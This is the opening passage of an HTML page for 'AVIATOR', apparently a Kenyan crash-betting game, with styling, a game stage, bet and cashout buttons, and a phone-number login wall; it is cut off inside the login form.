<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AVIATOR - Kenya's #1 Crash Game</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
body{background:#FFC107;min-height:100vh;padding:12px}
.card{background:#fff;border-radius:24px;padding:24px 16px;text-align:center;max-width:420px;margin:0 auto}
.login-wall{max-width:420px;margin:14px auto;background:#111;border-radius:24px;padding:20px;color:#fff}
#gameStage{width:100%;height:320px;background:linear-gradient(#87CEEB,#1a1a2e);border-radius:16px;position:relative;overflow:hidden;margin:14px 0;border:2px solid #333}
#plane{position:absolute;left:20px;bottom:30px;font-size:48px}
#plane.flying{animation:fly 8s linear forwards}
@keyframes fly{0%{left:20px;bottom:30px}50%{left:180px;bottom:180px}100%{left:400px;bottom:300px;opacity:0}}
#multiplier{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:56px;font-weight:900;color:#FFC107;text-shadow:0 0 20px #000}
input{width:100%;padding:14px;border-radius:12px;border:none;margin-bottom:10px;text-align:center}
.btn{border:none;border-radius:999px;padding:16px;width:100%;font-weight:800;cursor:pointer}
.btn-yellow{background:#FFC107;color:#000}
.btn-green{background:#00ff88;color:#000}
.hidden{display:none}
</style>
</head>
<body>

<div class="card">
<h1>✈️ AVIATOR</h1>
<p style="font-size:12px;color:#555">Fly High, Win Big - Kenya's #1 Crash Game</p>

<div id="gameStage" class="hidden">
<div id="multiplier">1.00x</div>
<div id="plane">✈️</div>
<svg style="position:absolute;bottom:0;left:0;width:100%;height:100%" viewBox="0 0 400 320"><polyline id="line" fill="none" stroke="#FFC107" stroke-width="3" points="20,290"/></svg>
</div>

<div id="preLogin">
<div style="margin:20px 0;font-size:48px">🔒</div>
<h3>LOGIN REQUIRED</h3>
<p style="font-size:12px;color:#666">No demo play - Must login to fly</p>
<button class="btn btn-yellow" style="margin-top:14px" onclick="loginWall.scrollIntoView({behavior:'smooth'})">LOGIN TO FLY</button>
</div>

<div id="postLogin" class="hidden">
<div style="display:flex;gap:8px">
<input id="betAmount" value="100" type="number" style="flex:1">
<button id="betBtn" class="btn btn-green" style="flex:1" onclick="placeBet()">BET</button>
</div>
<button id="cashBtn" class="btn btn-yellow hidden" onclick="cashOut()" style="margin-top:8px;background:#fff">CASHOUT <span id="cashMult">1.00x</span></button>
</div>
</div>

<div class="login-wall" id="loginWall">
<h3 style="color:#FFC107;text-align:center" id="authTitle">🔒 LOGIN REQUIRED</h3>

<div id="loginForm">
<input id="lPhone" placeholder="Phone: 2547XXXXXXXX">
<input id
